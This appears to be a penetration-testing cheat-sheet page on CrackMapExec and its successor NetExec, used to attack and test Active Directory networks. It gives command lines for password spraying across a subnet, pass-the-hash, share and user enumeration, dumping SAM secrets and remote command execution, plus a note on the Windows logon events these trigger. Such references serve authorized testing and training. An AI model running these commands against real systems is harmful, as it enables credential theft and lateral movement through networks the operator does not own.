# CrackMapExec / NetExec

CrackMapExec (CME) — now maintained as its fork **NetExec (nxc)** — is a swiss-army-knife tool for testing and pivoting through Active Directory environments. It automates credential validation, enumeration, and command execution across many hosts at once over SMB, WinRM, LDAP, MSSQL, and more.

## Common Use Cases

* Spraying a single credential (or hash) across a whole subnet to find where it's valid
* Enumerating shares, sessions, logged-on users, and domain info at scale
* Dumping SAM/LSA secrets or NTDS.dit via a validated admin credential
* Executing commands or deploying payloads across multiple hosts

## Core Syntax

```
# Validate credentials across a subnet
netexec smb 10.10.10.0/24 -u jdoe -p 'Password123!'

# Pass-the-hash
netexec smb 10.10.10.10 -u administrator -H <NTLM hash>

# Enumerate shares / logged-on users
netexec smb 10.10.10.10 -u jdoe -p 'Password123!' --shares
netexec smb 10.10.10.10 -u jdoe -p 'Password123!' --loggedon-users

# Dump SAM (requires local admin)
netexec smb 10.10.10.10 -u administrator -p 'Password123!' --sam

# Execute a command
netexec smb 10.10.10.10 -u administrator -p 'Password123!' -x "whoami"
```

{% hint style="info" %}
The original `crackmapexec` package is unmaintained; **NetExec (`nxc`)** is the actively developed successor with the same core syntax. Use it unless a lab environment specifically expects the old binary.
{% endhint %}

{% hint style="warning" %}
Spraying credentials or hashes across many hosts generates a lot of authentication events (4624/4625/4776) very quickly and is one of the more detectable lateral-movement techniques. Throttle requests and expect this to show up in SIEM alerting on real networks.
{% endhint %}

## Related

* Metasploit — exploitation and payload generation
* Evil-WinRM — follow-up interactive shell once valid creds are confirmed
